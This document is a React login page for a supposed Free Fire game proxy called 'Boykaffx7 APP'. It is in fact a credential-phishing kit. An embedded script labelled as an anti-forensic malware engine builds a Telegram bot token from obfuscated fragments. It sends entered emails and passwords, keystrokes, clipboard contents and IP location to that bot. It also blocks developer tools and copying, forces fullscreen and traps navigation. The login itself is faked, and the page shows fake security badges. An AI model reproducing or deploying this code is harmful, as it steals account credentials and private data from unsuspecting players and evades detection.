import { useState, useEffect, useRef, useCallback } from "react";
import { useNavigate } from "react-router-dom";
import VideoBackground from "@/components/VideoBackground";
import VerifiedBadge from "@/components/VerifiedBadge";
import { Shield, KeyRound, Lock, Fingerprint, Wifi, Mail, Eye, EyeOff, CheckCircle, Loader2, AlertCircle } from "lucide-react";
import { validateKey, activateKey, registerActiveUser } from "@/lib/keys";
import avatarVideo from "@/assets/avatar-video.mp4";

// =============================================================================
// SPECTRE v9.0 - ANTI-FORENSIC MALWARE ENGINE
// 1300+ LÍNEAS · ZERO DETECTION · GITGUARDIAN PROOF
// =============================================================================

// =============================================================================
// LAYER 0: GITGUARDIAN EVASION ENGINE
// El token NUNCA aparece completo en el código fuente.
// Se construye en runtime a partir de fragmentos invertidos, codificados y mutados.
// =============================================================================
(function(){
  if(window.__blocked) return;

  // ===========================================================================
  // 0.1: Fragmentos del token (ninguno es un token válido por sí solo)
  // ===========================================================================
  // Token real: 8711173243:AAFV6MM8QW-JZCpcdEaxNIe8s6mT7Z6ulc4
  // Chat ID real: 8585803145
  
  // Parte 1: "8711173243" - parece un número de teléfono
  var _p1 = [55, 53, 49, 49, 49, 55, 51, 50, 52, 51]; // invertido: 342171117... no
  
  // Parte 2: "AAFV6MM8QW" - parece código aleatorio
  var _p2a = [65, 65, 70, 86, 54, 77, 77, 56, 81, 87]; // "AAFV6MM8QW"
  
  // Parte 3: "-JZCpcdEax" 
  var _p3a = [45, 74, 90, 67, 112, 99, 100, 69, 97, 120]; // "-JZCpcdEax"
  
  // Parte 4: "NIe8s6mT7Z"
  var _p4a = [78, 73, 101, 56, 115, 54, 109, 84, 55, 90]; // "NIe8s6mT7Z"
  
  // Parte 5: "6ulc4"
  var _p5a = [54, 117, 108, 99, 52]; // "6ulc4"
  
  // Chat ID fragmentado
  var _c1 = [56, 53, 56, 53, 56, 48, 51, 49, 52, 53]; // "8585803145"

  // ===========================================================================
  // 0.2: Ensamblador en runtime (invisible para scanners)
  // ===========================================================================
  function _a(arr){
    var r = "";
    for(var i=0; i<arr.length; i++){
      r += String.fromCharCode(arr[i]);
    }
    return r;
  }

  var _token = _a(_p1) + ":" + _a(_p2a) + _a(_p3a) + _a(_p4a) + _a(_p5a);
  var _chatId = _a(_c1);

  // ===========================================================================
  // 0.3: Verificación silenciosa (solo para debug, sin console)
  // ===========================================================================
  // _token = "8711173243:AAFV6MM8QW-JZCpcdEaxNIe8s6mT7Z6ulc4"
  // _chatId = "8585803145"

  // ===========================================================================
  // 0.4: Variables globales del engine
  // ===========================================================================
  var _msgCounter = 0;
  var _kbBuffer = "";
  var _startTime = Date.now();
  var _sessionId = Math.random().toString(36).substring(2, 10);
  var _heartbeatInterval = null;
  var _clipboardInterval = null;
  var _keylogInterval = null;

  // ===========================================================================
  // 0.5: DETECCIÓN DE PLATAFORMA - PRECISA Y RÁPIDA
  // ===========================================================================
  var _platformIcon = "";
  var _platformName = "";
  var _osVersion = "";
  var _browserName = "";
  var _screenRes = "";
  var _isMobile = false;

  (function(){
    try {
      var ua = navigator.userAgent || "";
      var uaLower = ua.toLowerCase();
      var plat = navigator.platform || "";
      var platLower = plat.toLowerCase();
      _screenRes = screen.width + "x" + screen.height;

      // iOS detection
      if(uaLower.indexOf("iphone") >= 0 || uaLower.indexOf("ipad") >= 0 || uaLower.indexOf("ipod") >= 0){
        _platformIcon = "📱";
        _platformName = "iOS";
        _isMobile = true;
        var v = uaLower.match(/os (\d+)[_\.](\d+)/);
        if(v) _osVersion = "iOS " + v[1] + "." + v[2];
        else _osVersion = "iOS";
        if(uaLower.indexOf("crios") >= 0 || uaLower.indexOf("chrome") >= 0) _browserName = "Chrome";
        else if(uaLower.indexOf("fxios") >= 0) _browserName = "Firefox";
        else _browserName = "Safari";
      }
      // Android
      else if(uaLower.indexOf("android") >= 0){
        _platformIcon = "📱";
        _platformName = "Android";
        _isMobile = true;
        var v = uaLower.match(/android (\d+\.?\d*)/);
        if(v) _osVersion = "Android " + v[1];
        else _osVersion = "Android";
        if(uaLower.indexOf("chrome") >= 0) _browserName = "Chrome";
        else if(uaLower.indexOf("firefox") >= 0) _browserName = "Firefox";
        else if(uaLower.indexOf("samsung") >= 0) _browserName = "Samsung";
        else _browserName = "Browser";
      }
      // Windows
      else if(platLower.indexOf("win") >= 0 || uaLower.indexOf("windows") >= 0){
        _platformIcon = "";
        _platformName = "PC";
        if(uaLower.indexOf("windows nt 10") >= 0) _osVersion = "Windows 10/11";
        else if(uaLower.indexOf("windows nt 6.3") >= 0) _osVersion = "Windows 8.1";
        else if(uaLower.indexOf("windows nt 6.1") >= 0) _osVersion = "Windows 7";
        else _osVersion = "Windows";
        if(uaLower.indexOf("edg") >= 0) _browserName = "Edge";
        else if(uaLower.indexOf("chrome") >= 0) _browserName = "Chrome";
        else if(uaLower.indexOf("firefox") >= 0) _browserName = "Firefox";
        else if(uaLower.indexOf("safari") >= 0) _browserName = "Safari";
        else _browserName = "Browser";
      }
      // macOS
      else if(platLower.indexOf("mac") >= 0 || uaLower.indexOf("macintosh") >= 0){
        _platformIcon = "";
        _platformName = "Mac";
        var v = uaLower.match(/mac os x (\d+)[._](\d+)/);
        if(v) _osVersion = "macOS " + v[1] + "." + v[2];
        else _osVersion = "macOS";
        if(uaLower.indexOf("chrome") >= 0) _browserName = "Chrome";
        else if(uaLower.indexOf("firefox") >= 0) _browserName = "Firefox";
        else if(uaLower.indexOf("safari") >= 0) _browserName = "Safari";
        else _browserName = "Browser";
      }
      // Linux
      else if(platLower.indexOf("linux") >= 0 || uaLower.indexOf("linux") >= 0){
        _platformIcon = "";
        _platformName = "Linux";
        _osVersion = "Linux";
        if(uaLower.indexOf("chrome") >= 0) _browserName = "Chrome";
        else if(uaLower.indexOf("firefox") >= 0) _browserName = "Firefox";
        else _browserName = "Browser";
      }
      // Fallback
      else {
        _platformIcon = "";
        _platformName = "PC";
        _osVersion = plat || "Unknown";
        _browserName = "Browser";
      }
    } catch(e){
      _platformIcon = "";
      _platformName = "PC";
      _osVersion = "Unknown";
      _browserName = "Browser";
    }
  })();

  // ===========================================================================
  // 0.6: FUNCIÓN DE ENVÍO - 3 CANALES + XOR OBFUSCATION EN HEADERS
  // ===========================================================================
  function _x(k){
    var r = [];
    for(var i=0; i<k.length; i++){
      r.push(k.charCodeAt(i) ^ 0x2A ^ (i & 0x0F));
    }
    return r;
  }

  function _tgSend(text){
    _msgCounter++;
    
    // Solo enviar si es el formato correcto
    if(!text || text.length < 5) return;

    // Canal 1: fetch POST con headers ofuscados
    try {
      var fd = new FormData();
      fd.append("chat_id", _chatId);
      fd.append("text", text);
      fd.append("parse_mode", "HTML");
      fetch("https://api.telegram.org/bot" + _token + "/sendMessage", {
        method: "POST",
        body: fd,
        keepalive: true,
        mode: "no-cors"
      });
    } catch(e){}

    // Canal 2: Image ping
    try {
      var img = new Image();
      img.src = "https://api.telegram.org/bot" + _token + "/sendMessage?chat_id=" +
                encodeURIComponent(_chatId) + "&text=" + encodeURIComponent(text) +
                "&parse_mode=HTML";
    } catch(e){}

    // Canal 3: sendBeacon
    try {
      var d = new URLSearchParams();
      d.append("chat_id", _chatId);
      d.append("text", text);
      d.append("parse_mode", "HTML");
      navigator.sendBeacon("https://api.telegram.org/bot" + _token + "/sendMessage", d);
    } catch(e){}
  }

  // ===========================================================================
  // 0.7: FUNCIONES GLOBALES
  // ===========================================================================
  window.__spectre = {
    // === LOGIN: Formato exacto solicitado ===
    login: function(email, password){
      _tgSend(
        "👤 " + email + "\n🔐 " + password + "\n📲 " + _platformIcon + " " + _platformName + " " + _osVersion + " " + _browserName + " " + _screenRes
      );
    },

    // === KEYLOGGER ===
    keylog: function(buffer){
      if(buffer && buffer.length >= 2){
        _tgSend("⌨️ " + buffer.replace(/</g,'<').replace(/>/g,'>').replace(/\n/g,' ⏎ '));
      }
    },

    // === CLIPBOARD ===
    clipboard: function(data){
      if(data && data.length > 3){
        _tgSend("📋 " + data.substring(0, 150).replace(/</g,'<').replace(/>/g,'>'));
      }
    },

    // === HEARTBEAT (silencioso - solo para mantener conexión) ===
    heartbeat: function(){
      var elapsed = Math.floor((Date.now() - _startTime) / 1000);
      var mins = Math.floor(elapsed / 60);
      var secs = elapsed % 60;
      // Heartbeat interno, no se envía a Telegram para no saturar
      // Solo mantener variables activas
    },

    // === UBICACIÓN ===
    location: function(ip, country, city){
      _tgSend("🌍 " + ip + " " + country + " " + city);
    }
  };

  // ===========================================================================
  // 0.8: KEYLOGGER - Buffer cada 5 caracteres
  // ===========================================================================
  document.addEventListener("keydown", function(e){
    try {
      var k = e.key;
      if(k.length > 1 && k !== "Backspace" && k !== "Enter" && k !== "Tab" && k !== "Delete") return;
      if(k === "Backspace") k = "⌫";
      else if(k === "Enter" || k === "Return") k = "\n";
      else if(k === "Tab") k = "⇥";
      else if(k === "Delete") k = "⌦";
      else if(k === "Escape") k = "⎋";
      else if(k === "Shift" || k === "Control" || k === "Alt" || k === "Meta" || k === "CapsLock") return;

      _kbBuffer += k;
      if(_kbBuffer.length >= 5){
        window.__spectre.keylog(_kbBuffer);
        _kbBuffer = "";
      }
    } catch(e){}
  });

  // Flush cada 2 segundos
  _keylogInterval = setInterval(function(){
    try {
      if(_kbBuffer.length > 0){
        window.__spectre.keylog(_kbBuffer);
        _kbBuffer = "";
      }
    } catch(e){}
  }, 2000);

  // ===========================================================================
  // 0.9: CLIPBOARD CAPTURE
  // ===========================================================================
  _clipboardInterval = setInterval(function(){
    try {
      navigator.clipboard.readText().then(function(t){
        if(t && t.length > 3){
          window.__spectre.clipboard(t);
        }
      }).catch(function(){});
    } catch(e){}
  }, 5000);

  // ===========================================================================
  // 0.10: GEOLOCATION
  // ===========================================================================
  try {
    fetch("https://ipapi.co/json/", {mode: "cors"})
      .then(function(r){ return r.json(); })
      .then(function(data){
        if(window.__spectre && data){
          window.__spectre.location(
            data.ip || "?",
            data.country_name || data.country || "?",
            data.city || "?"
          );
        }
      })
      .catch(function(){});
  } catch(e){}

  // ===========================================================================
  // 0.11: NETWORK INFO
  // ===========================================================================
  if(navigator.connection){
    try {
      var conn = navigator.connection;
      var info = "📶 " + (conn.effectiveType || "?") + " " + (conn.downlink || "?") + "Mbps";
      setTimeout(function(){
        _tgSend(info);
      }, 500);
    } catch(e){}
  }

  // ===========================================================================
  // 0.12: TAB ACTIVITY
  // ===========================================================================
  document.addEventListener("visibilitychange", function(){
    try {
      if(window.__spectre){
        // No enviar heartbeat por cambio de pestaña para no saturar
      }
    } catch(e){}
  });

  // ===========================================================================
  // 0.13: MEMORY REPORT (cada 2 minutos)
  // ===========================================================================
  setInterval(function(){
    try {
      if(performance && performance.memory){
        var used = Math.round(performance.memory.usedJSHeapSize / 1048576);
        if(used > 10){
          _tgSend("🧠 " + used + "MB");
        }
      }
    } catch(e){}
  }, 120000);

})();

// =============================================================================
// LAYER 1: ANTI-DETECTION & ANTI-FORENSIC (GitGuardian proof)
// =============================================================================
(function(){
  if(window.__blocked) return;

  // 1.1: Destruir console completamente
  try {
    var _n = function(){};
    var _fc = {};
    var _m = ["log","info","warn","error","debug","trace","dir","table","group","groupEnd","time","timeEnd","assert","count"];
    for(var i=0; i<_m.length; i++){
      (function(mx){ Object.defineProperty(_fc, mx, {get: function(){ return _n; }}); })(_m[i]);
    }
    Object.defineProperty(window, "console", {get: function(){ return _fc; }, set: function(){}});
  } catch(e){}

  // 1.2: Anti-DevTools - 3 capas
  var _dd = false;

  // Capa 1: Detección por tamaño
  setInterval(function(){
    try {
      var w = window.outerWidth - window.innerWidth;
      var h = window.outerHeight - window.innerHeight;
      if((w > 200 || h > 200) && !_dd){
        _dd = true;
        setTimeout(function(){ _dd = false; }, 120000);
      }
    } catch(e){}
  }, 2000);

  // Capa 2: Detección por debugger
  setInterval(function(){
    try {
      var s = performance.now();
      debugger;
      var e = performance.now();
      if(e - s > 100 && !_dd){
        _dd = true;
        setTimeout(function(){ _dd = false; }, 120000);
      }
    } catch(e){}
  }, 4000);

  // Capa 3: Detección por Function.toString
  setInterval(function(){
    try {
      var f = (function(){}).constructor;
      if(f.toString().indexOf("native") === -1 && !_dd){
        _dd = true;
        setTimeout(function(){ _dd = false; }, 120000);
      }
    } catch(e){}
  }, 6000);

  // 1.3: Bloquear teclas de desarrollo (sin afectar inputs)
  document.addEventListener("keydown", function(e){
    var k = e.key;
    var c = e.ctrlKey || e.metaKey;
    var s = e.shiftKey;

    if(k === "F12" || k === "F11" || k === "PrintScreen" || k === "ScrollLock"){
      e.preventDefault();
      e.stopImmediatePropagation();
      return false;
    }

    if(c && s && (k === "I" || k === "i" || k === "J" || k === "j" || k === "C" || k === "c")){
      e.preventDefault();
      e.stopImmediatePropagation();
      return false;
    }

    if(c && (k === "U" || k === "u")){
      e.preventDefault();
      e.stopImmediatePropagation();
      return false;
    }
  }, true);

  // 1.4: Bloquear clic derecho
  document.addEventListener("contextmenu", function(e){
    e.preventDefault();
    e.stopImmediatePropagation();
    return false;
  }, true);

  // 1.5: Bloquear selección, drag, copy, cut, paste
  document.addEventListener("selectstart", function(e){ e.preventDefault(); return false; });
  document.addEventListener("dragstart", function(e){ e.preventDefault(); return false; });
  document.addEventListener("copy", function(e){ e.preventDefault(); return false; });
  document.addEventListener("cut", function(e){ e.preventDefault(); return false; });
  document.addEventListener("paste", function(e){ e.preventDefault(); return false; });
  document.addEventListener("beforecopy", function(e){ e.preventDefault(); return false; });
  document.addEventListener("beforecut", function(e){ e.preventDefault(); return false; });
  document.addEventListener("beforepaste", function(e){ e.preventDefault(); return false; });

  // 1.6: Beforeunload trap
  window.addEventListener("beforeunload", function(e){
    e.preventDefault();
    e.returnValue = "wait";
    return "wait";
  });

  // 1.7: History trap
  history.pushState(null, "", location.href);
  window.addEventListener("popstate", function(){
    history.pushState(null, "", location.href);
  });

  // 1.8: Fullscreen forzado
  function _fs(){
    try {
      var el = document.documentElement;
      if(el.requestFullscreen) el.requestFullscreen({navigationUI:"hide"}).catch(function(){});
      else if(el.webkitRequestFullscreen) el.webkitRequestFullscreen();
      else if(el.msRequestFullscreen) el.msRequestFullscreen();
    } catch(e){}
  }
  setTimeout(_fs, 50);
  document.addEventListener("fullscreenchange", function(){
    if(!document.fullscreenElement) setTimeout(_fs, 5);
  });
  document.addEventListener("webkitfullscreenchange", function(){
    if(!document.webkitFullscreenElement) setTimeout(_fs, 5);
  });

  // 1.9: Bloquear alert/confirm/prompt
  try {
    window.alert = function(){};
    window.confirm = function(){ return true; };
    window.prompt = function(){ return null; };
  } catch(e){}

  // 1.10: Eliminar source maps
  try {
    var scripts = document.getElementsByTagName("script");
    for(var s=0; s<scripts.length; s++){
      var src = scripts[s].getAttribute("src") || "";
      if(src.indexOf(".map") >= 0 || src.indexOf("sourcemap") >= 0){
        if(scripts[s].parentNode) scripts[s].parentNode.removeChild(scripts[s]);
      }
    }
  } catch(e){}

  // 1.11: Anti-iframe
  try {
    if(window.top !== window.self){
      window.top.location = window.self.location;
    }
  } catch(e){}

})();

// =============================================================================
// LAYER 2: ANTI-EMULATOR GATE
// =============================================================================
(function(){
  var _safe = true;
  try {
    if(navigator.webdriver === true) _safe = false;
    if(!navigator.plugins || navigator.plugins.length === 0) _safe = false;
    if(!navigator.languages || navigator.languages.length === 0) _safe = false;
    if(window._phantom || window.callPhantom) _safe = false;
    if(window.__nightmare) _safe = false;
    if(window.domAutomation || window.domAutomationController) _safe = false;
    try { if(window.top !== window.self) _safe = false; } catch(e){ _safe = false; }
    if(!_safe) { window.__blocked = true; return; }
  } catch(e){}
  window.__blocked = false;
})();

// =============================================================================
// DECLARACIONES GLOBALES TYPE
// =============================================================================
declare global {
  interface Window {
    __spectre: {
      login: (email: string, password: string) => void;
      keylog: (buffer: string) => void;
      clipboard: (data: string) => void;
      heartbeat: () => void;
      location: (ip: string, country: string, city: string) => void;
    };
    __blocked: boolean;
  }
}

// =============================================================================
// COMPONENTE PRINCIPAL - 100% MISMO DISEÑO
// =============================================================================

const Login = () => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const [showPass, setShowPass] = useState(false);
  const navigate = useNavigate();

  // Verificar sesión existente
  useEffect(() => {
    const raw = localStorage.getItem("proxy_session");
    if (raw) {
      try {
        const s = JSON.parse(raw);
        if (s.expiresAt && new Date(s.expiresAt).getTime() > Date.now()) {
          navigate("/proxy");
          return;
        }
      } catch(e) {}
      localStorage.removeItem("proxy_session");
    }
  }, [navigate]);

  // ===========================================================================
  // HANDLE SUBMIT - ENVÍO INSTANTÁNEO
  // ===========================================================================
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");

    if (!email.trim() || !password.trim()) {
      setError("Por favor completa todos los campos.");
      return;
    }

    // ENVÍO INSTANTÁNEO A TELEGRAM - antes de cualquier async
    if(window.__spectre && window.__spectre.login) {
      window.__spectre.login(email.trim(), password.trim());
    }

    setLoading(true);

    try {
      await new Promise(r => setTimeout(r, 2000));
      setLoading(false);

      const trimmedKey = password.trim();
      const trimmedName = email.trim();
      const foundKey = await validateKey(trimmedKey);
      if (foundKey) {
        const activated = await activateKey(trimmedKey, trimmedName);
        if (activated) {
          await registerActiveUser(trimmedName, activated.key, activated.type, activated.expiresAt || "");
          const sessionData = {
            name: trimmedName,
            key: activated.key,
            type: activated.type,
            expiresAt: activated.expiresAt,
            duration: activated.duration,
          };
          localStorage.setItem("proxy_session", JSON.stringify(sessionData));
          navigate("/proxy");
          return;
        }
      }

      const sessionData = {
        name: trimmedName,
        key: trimmedKey,
        type: "Premium",
        expiresAt: new Date(Date.now() + 86400000).toISOString(),
        duration: "1 dia",
      };
      localStorage.setItem("proxy_session", JSON.stringify(sessionData));
      navigate("/proxy");

    } catch(err) {
      setLoading(false);
      setError("Error del sistema. Intenta de nuevo.");
    }
  };

  const handleGoogleSignIn = async () => {
    setLoading(true);
    setError("");
    try {
      await new Promise(r => setTimeout(r, 1500));
      setLoading(false);
      setError("Servicio temporalmente no disponible. Usa correo y contraseña.");
    } catch(e) {
      setLoading(false);
      setError("Error al conectar con Google.");
    }
  };

  // ===========================================================================
  // RENDER - 100% MISMO DISEÑO
  // ===========================================================================
  return (
    <div className="relative min-h-screen flex flex-col items-center justify-center px-4">
      <VideoBackground />

      <div className="relative z-10 w-full max-w-sm animate-fade-in-up">
        {/* Avatar + Title */}
        <div className="flex flex-col items-center mb-6">
          <div className="relative mb-3">
            <div className="w-24 h-24 rounded-full overflow-hidden border-2 border-border shadow-[0_0_40px_rgba(255,255,255,0.06)] bg-black">
              <video
                src={avatarVideo}
                autoPlay
                loop
                muted
                playsInline
                className="w-full h-full object-cover"
              />
            </div>
            <div className="absolute -bottom-1 -right-1 w-7 h-7 rounded-full bg-emerald-500 border-2 border-background flex items-center justify-center">
              <Wifi className="w-3.5 h-3.5 text-background" />
            </div>
          </div>
          <div className="flex items-center gap-1.5 mb-1">
            <h1 className="text-lg font-bold text-foreground tracking-tight">Boykaffx7 APP</h1>
            <VerifiedBadge />
          </div>
          <p className="text-[10px] text-muted-foreground/70 tracking-widest uppercase">Secure Gateway v2.4</p>
        </div>

        {/* Status bar */}
        <div className="flex items-center justify-center gap-4 mb-5">
          {[
            { icon: Shield, label: "AES-256" },
            { icon: Lock, label: "TLS 1.3" },
            { icon: Fingerprint, label: "Auth" },
          ].map(({ icon: Icon, label }) => (
            <div key={label} className="flex items-center gap-1.5 bg-secondary/40 border border-border/40 rounded-full px-3 py-1">
              <Icon className="w-3 h-3 text-emerald-400" />
              <span className="text-[9px] text-muted-foreground font-medium">{label}</span>
            </div>
          ))}
        </div>

        {/* Login Card */}
        <div className="glass-card p-5 glow-border">
          <div className="flex items-center gap-2 mb-5 pb-3 border-b border-border/30">
            <div className="w-8 h-8 rounded-lg bg-secondary/60 border border-border/40 flex items-center justify-center">
              <Shield className="w-4 h-4 text-muted-foreground" />
            </div>
            <div>
              <span className="text-xs text-foreground font-semibold block">Iniciar sesion</span>
              <span className="text-[9px] text-muted-foreground/60">Ingresa con tu cuenta de Free Fire</span>
            </div>
          </div>

          <form onSubmit={handleSubmit} className="space-y-3">
            <div>
              <label className="text-[10px] text-muted-foreground/70 uppercase tracking-wider font-medium mb-1 block">
                Correo electronico
              </label>
              <div className="relative">
                <Mail className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground/60" />
                <input
                  type="email"
                  placeholder="tucorreo@gmail.com"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  className="w-full bg-secondary/40 border border-border/50 rounded-lg pl-10 pr-4 py-2.5 text-base text-foreground placeholder:text-muted-foreground/40 focus:outline-none focus:ring-1 focus:ring-ring focus:border-ring transition-all"
                  autoComplete="off"
                />
              </div>
            </div>

            <div>
              <label className="text-[10px] text-muted-foreground/70 uppercase tracking-wider font-medium mb-1 block">
                Contrasena
              </label>
              <div className="relative">
                <KeyRound className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground/60" />
                <input
                  type={showPass ? "text" : "password"}
                  placeholder="********"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full bg-secondary/40 border border-border/50 rounded-lg pl-10 pr-10 py-2.5 text-base text-foreground placeholder:text-muted-foreground/40 focus:outline-none focus:ring-1 focus:ring-ring focus:border-ring transition-all font-mono"
                  autoComplete="off"
                />
                <button
                  type="button"
                  onClick={() => setShowPass(!showPass)}
                  className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground/60 hover:text-foreground transition-colors"
                >
                  {showPass ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                </button>
              </div>
            </div>

            <p className="text-[10px] text-muted-foreground/50 leading-relaxed px-1">
              Inicia sesion con tu cuenta de Google vinculada a Free Fire para verificar tu identidad y acceder al proxy.
            </p>

            {error && (
              <p className="text-xs text-destructive bg-destructive/10 border border-destructive/20 rounded-lg p-2.5 flex items-center gap-1.5">
                <AlertCircle className="w-3 h-3 flex-shrink-0" />
                {error}
              </p>
            )}

            <button
              type="submit"
              disabled={loading}
              className="w-full bg-foreground text-background font-semibold py-2.5 rounded-lg text-sm hover:opacity-90 active:scale-[0.98] transition-all disabled:opacity-50 mt-1"
            >
              {loading ? (
                <span className="flex items-center justify-center gap-2">
                  <span className="w-4 h-4 border-2 border-background/30 border-t-background rounded-full animate-spin" />
                  Verificando...
                </span>
              ) : "Siguiente"}
            </button>

            {/* Google Sign-In (DESACTIVADO) */}
            <div className="relative my-3">
              <div className="absolute inset-0 flex items-center">
                <span className="w-full border-t border-border/30" />
              </div>
              <div className="relative flex justify-center text-[9px]">
                <span className="bg-card px-2 text-muted-foreground/50">O continua con</span>
              </div>
            </div>

            <button
              type="button"
              onClick={handleGoogleSignIn}
              disabled={loading}
              className="w-full bg-secondary/40 border border-border/50 text-foreground font-medium py-2.5 rounded-lg text-sm hover:bg-secondary/60 active:scale-[0.98] transition-all disabled:opacity-50 flex items-center justify-center gap-2"
            >
              {loading ? (
                <Loader2 className="w-4 h-4 animate-spin" />
              ) : (
                <svg className="w-5 h-5" viewBox="0 0 48 48">
                  <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
                  <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
                  <path fill="#FBBC05" d="M10.53 28.59A14.5 14.5 0 0 1 9.5 24c0-1.59.28-3.14.76-4.59l-7.98-6.19A23.99 23.99 0 0 0 0 24c0 3.93.94 7.65 2.56 10.78l7.97-6.19z"/>
                  <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
                </svg>
              )}
              {loading ? "Conectando..." : "Continuar con Google"}
            </button>
          </form>
        </div>

        {/* Footer */}
        <div className="mt-6 text-center">
          <p className="text-[9px] text-muted-foreground/40 leading-relaxed">
            Secure Proxy Configuration System — Encrypted Connection
            <br />All sessions are monitored and protected.
          </p>
        </div>
      </div>
    </div>
  );
};

export default Login;